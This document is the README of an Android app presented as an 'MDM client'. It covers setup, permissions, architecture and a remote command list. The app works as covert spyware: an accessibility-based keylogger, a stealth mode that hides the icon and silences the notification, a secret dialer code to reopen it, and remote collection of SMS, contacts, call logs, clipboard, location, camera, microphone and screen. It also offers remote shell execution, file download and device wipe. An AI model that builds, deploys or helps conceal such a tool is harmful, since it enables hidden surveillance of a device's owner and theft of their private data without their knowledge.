# Android MDM Client

## Build Requirements

- Android Studio Hedgehog (2023.1.1) or newer
- Android SDK 34+
- Kotlin 1.9+
- JDK 17

## Setup

### 1. Firebase (Optional)

If using push notifications (FCM):

1. Go to [Firebase Console](https://console.firebase.google.com/) and create a project
2. Add an Android app with package name `com.mdm.client`
3. Download `google-services.json` and place it at `android-client/app/google-services.json`

If **not** using Firebase, comment out the plugin in `app/build.gradle`:
```gradle
// apply plugin: 'com.google.gms.google-services'
```

### 2. Build

1. Open the `android-client` folder in Android Studio
2. Let Gradle sync
3. Connect your Android device (USB debugging enabled)
4. Click **Run** or `Shift+F10`

### 3. First Launch

1. The app opens a setup screen asking for the **Server IP**
2. Enter your server's local IP (e.g., `192.168.1.100`)
   - Find it with `ipconfig` (Windows) or `ifconfig` (Linux/Mac)
3. Grant all requested permissions when prompted
4. Enable **Accessibility Service** for keylogging (tap the button, find "MDM Client" in the list)
5. Enable **Usage Stats** access (tap the button)
6. Accept **MediaProjection** for VNC/screenshots
7. Tap **Save** to start the service

### 4. Stealth Mode

After saving, the app will ask if you want to hide it:

- **Hide**: App icon disappears from launcher and app drawer. The service runs silently with a minimal notification (no title, no text, hidden on lockscreen).
- **Keep Visible**: Icon stays in the launcher as normal.

#### How to reopen when hidden

| Method | How |
|--------|-----|
| Secret dialer code | Dial `*#*#636#*#*` on the phone dialer |
| Remote command | Send `SHOW_APP` from the web dashboard command center |
| ADB | `adb shell am start -n com.mdm.client/.MainActivity` |

To hide again remotely, send the `HIDE_APP` command from the dashboard.

## Permissions Summary

| Permission | Purpose |
|-----------|---------|
| Location (fine + background) | GPS tracking |
| SMS, Contacts, Call Log | Communication data collection |
| Camera, Microphone | Live camera stream, mic recording |
| Storage | File manager access |
| Phone State | Device info (IMEI, carrier) |
| Accessibility Service | Keylogger |
| Usage Stats | App usage tracking |
| Device Admin | Lock, wipe, reboot, kiosk mode |
| MediaProjection | VNC screen streaming, screenshots |
| Battery Optimization Exempt | Prevents Android from killing the service |

## Architecture

```
com.mdm.client/
  MainActivity.kt          — Setup UI + permission flow + stealth toggle
  MdmApplication.kt        — App init, notification channel (IMPORTANCE_MIN)
  SecretCodeReceiver.kt     — Dialer code *#*#636#*#* to unhide app
  BootReceiver.kt           — Auto-start service on boot

  config/
    AppConfig.kt            — Encrypted SharedPreferences (server IP, device ID, FCM token)

  service/
    MdmForegroundService.kt — Main background service, command polling, component init

  commands/
    CommandExecutor.kt      — Executes MDM commands (lock/wipe/reboot/kiosk/hide/show)
    CommandQueue.kt         — SQLite offline command queue
    MdmDeviceAdminReceiver.kt — Device admin for lock/wipe

  fcm/
    MdmFirebaseMessagingService.kt — Receives FCM push commands

  network/
    ApiClient.kt            — HTTP client for server API
    CameraSocketClient.kt   — Socket.IO for camera streaming
    VncSocketClient.kt      — Socket.IO for VNC streaming

  collectors/
    DeviceInfoCollector.kt  — Battery, SIM, OS, hardware info
    LocationCollector.kt    — GPS/network location
    SmsCollector.kt         — SMS messages
    ContactsCollector.kt    — Contacts
    CallLogCollector.kt     — Call history
    AppsCollector.kt        — Installed apps

  media/
    CameraManager.kt        — Camera stream via CameraX
    MicrophoneManager.kt    — Audio recording
    ScreenCaptureManager.kt — VNC via MediaProjection
    ScreenshotManager.kt    — Screenshot capture

  keylogger/
    KeyloggerAccessibilityService.kt — Accessibility-based keystroke capture
    KeyloggerManager.kt     — Manages keylogger state + API sync

  server/
    DeviceHttpServer.kt     — NanoHTTPD on port 8080 for direct HTTP commands
```

## Command Delivery

Commands reach the device through 3 channels (in priority order):

1. **FCM Push** — Instant delivery via Firebase Cloud Messaging (requires Firebase setup)
2. **HTTP Polling** — Device polls `GET /commands/pending/<deviceId>` every 30 seconds
3. **Direct HTTP** — Server sends HTTP request to device's IP on port 8080 (same network only)

## Supported Commands

### Device Control
| Command | Action |
|---------|--------|
| `LOCK_DEVICE` | Lock screen immediately |
| `UNLOCK_DEVICE` | Reset password and lock (Device Admin) |
| `WIPE_DEVICE` | Factory reset (requires Device Admin) |
| `REBOOT_DEVICE` | Reboot (requires Device Owner or root) |
| `SHUTDOWN_DEVICE` | Shutdown (requires root) |
| `SET_PASSWORD` | Set device lock password (Device Admin) |
| `CLEAR_PASSWORD` | Remove device lock password (Device Admin) |

### App Management
| Command | Action |
|---------|--------|
| `INSTALL_APP` | Prompt to install APK from URL |
| `UNINSTALL_APP` | Uninstall app by package name |
| `LAUNCH_APP` | Launch app by package name |
| `KILL_APP` | Force stop app (requires root) |
| `CLEAR_APP_DATA` | Clear app data (requires root) |
| `START_KIOSK_MODE` | Lock device to a single app |
| `STOP_KIOSK_MODE` | Exit kiosk mode |

### Data Collection
| Command | Action |
|---------|--------|
| `GET_LOCATION` | Fetch fresh GPS location |
| `GET_DEVICE_INFO` | Fetch device hardware/software info |
| `GET_CONTACTS` | Sync contacts to server |
| `GET_SMS` | Sync SMS messages to server |
| `GET_CALL_LOGS` | Sync call history to server |
| `GET_APPS` | Sync installed apps list to server |
| `CAPTURE_SCREENSHOT` | Take a screenshot |
| `GET_CLIPBOARD` | Read clipboard contents |

### Media & Streaming
| Command | Action |
|---------|--------|
| `START_CAMERA` / `STOP_CAMERA` | Live camera stream |
| `START_VNC` / `STOP_VNC` | Live screen stream |
| `START_MIC_RECORDING` / `STOP_MIC_RECORDING` | Audio recording |

### Communication
| Command | Action |
|---------|--------|
| `SEND_SMS` | Send SMS (payload: `phone_number`, `message`) |
| `MAKE_CALL` | Initiate phone call (payload: `phone_number`) |

### Audio & Display
| Command | Action |
|---------|--------|
| `SET_VOLUME` | Set media volume (payload: `level` 0-100) |
| `SET_RINGTONE_MODE` | Set ringer mode: normal/silent/vibrate |
| `PLAY_SOUND` | Play default notification sound |
| `VIBRATE` | Vibrate device |
| `SET_BRIGHTNESS` | Set screen brightness (payload: `level` 0-255) |
| `SET_SCREEN_TIMEOUT` | Set screen timeout in ms |

### Network & Stealth
| Command | Action |
|---------|--------|
| `TOGGLE_WIFI` | Toggle WiFi on/off |
| `TOGGLE_BLUETOOTH` | Toggle Bluetooth on/off |
| `HIDE_APP` | Hide app icon from launcher |
| `SHOW_APP` | Restore app icon to launcher |

### Advanced
| Command | Action |
|---------|--------|
| `SHELL_EXEC` | Execute shell command (payload: `command`, optional `root`) |
| `DELETE_FILE` | Delete file on device (payload: `path`) |
| `DOWNLOAD_FILE` | Download file from URL to device (payload: `url`, `path`) |
| `SET_CLIPBOARD` | Set clipboard text (payload: `text`) |
| `SHOW_TOAST` | Show toast message (payload: `message`) |
| `OPEN_URL` | Open URL in browser (payload: `url`) |
